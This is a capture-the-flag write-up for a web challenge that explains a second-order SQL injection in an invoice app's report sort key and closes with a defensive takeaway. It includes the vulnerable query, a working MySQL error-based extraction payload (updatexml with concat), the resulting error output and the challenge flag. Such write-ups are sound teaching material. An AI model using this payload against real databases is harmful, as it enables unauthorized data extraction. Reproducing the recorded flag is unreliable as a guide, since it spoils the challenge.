# Second

**Category:** Web · **Points:** 100 · **Challenge ID:** 22

---

**Brief.** "Keep your invoices tidy — and sort your reports however you like."

**Source review.** In `routes/reports.py`, the user-controlled `sort_key` is
stored safely with a parameterized INSERT, but later interpolated raw into an
ORDER BY clause:

```python
rows = db.query_all(
    "SELECT id, label, amount, status, created_at FROM invoices "
    f"WHERE user_id = {user['id']} ORDER BY {report['sort_key']}"
)
```

This is a second-order SQL injection: the malicious value is stored on create
and only executes when the report is run. The exception is rendered back into
`report_run.html`, so error-based extraction works.

**Exploit.**

1. Register/login on the instance (`http://172.198.60.104:8082` during the
   event).
2. Create a report with a benign title and this `sort_key` (70 chars, under the
   100-char column limit):

   ```sql
   updatexml(1,concat(0x7e,(select flag_value from flags limit 1)),1)
   ```

3. Open `/reports/<id>/run`. MySQL raises an XPath error containing the flag:

   ```text
   XPATH syntax error: '~InIt{s3c0nd_0rd3r_1nj3ct10n}'
   ```

**Flag.** `InIt{s3c0nd_0rd3r_1nj3ct10n}`

**Takeaway.** "Stored safely" is not the same as "used safely." Any second-order
sink that concatenates stored text still needs parameterization (or a strict
allow-list for sort columns).
